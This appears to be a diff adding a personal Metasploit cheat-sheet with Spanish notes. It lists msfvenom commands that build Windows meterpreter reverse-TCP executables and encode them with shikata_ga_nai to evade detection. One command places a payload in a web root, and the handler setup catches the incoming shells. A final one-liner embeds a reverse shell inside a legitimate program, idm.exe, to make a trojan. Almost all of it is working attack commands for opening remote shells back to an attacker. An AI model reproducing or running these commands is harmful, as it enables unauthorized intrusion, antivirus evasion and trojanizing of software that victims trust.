@@ -1,0 +1,40 @@
+
+-l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
+
+::: msfvenom -l payloads 
+::: msfvenom -l encoders          <3 <3 <3 <3
+
+
+
+::: msfvenom  -p windows/x64/meterpreter_reverse_tcp  -a x64  LHOST=ipKaliHere  LPORT=portHere  -f exe  -o nameFile.exe
+
+::: msfvenom  -p windows/x64/meterpreter_reverse_tcp  -a x64  lhost=ipKaliHere  lport=portHere  -f exe > nameFile.exe
+
+::: msfvenom  "     "   "   "   "   "   " -e x86/shikata_ga_nai -i 5 -b '\x00\xff'
+                                      
+                                            -i numberHere               n[umero que veces a encodearOfuscar
+                                            -b caracteresA_eliminar     bad chars ('::: msfvenom    en ls lista de comando sugiere esos --bad-chars    '\x00\xff'')
+
+
+::: msfvenom  -p windows/x64/meterpreter_reverse_tcp  -a x64  lhost=ipKaliHere  lport=portHere  -f exe > /var/www/html/nameFile.exe
+
+###  METERPRETER  ponernos en escucha para recibir meterpreter post msfvenom
+
+  ::: msfconsole
+
+  ::: use  exploit/multi/handler
+
+  ::: set  LHOST=ipKALI_here                          /// yep nuestra ip local NO el target
+
+  ::: set  LPORT=portHere
+
+  ::: set  payload  windows/meterpreter/reverse_tcp
+
+  ::: run
+
+
+###  METERPRETER  ponernos en escucha para recibir meterpreter post msfvenom
+
+
+
+msfvenom -a x86 --platform windows -x $HOME/Downloads/idm.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.0.16 lport=888 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o mango.exe
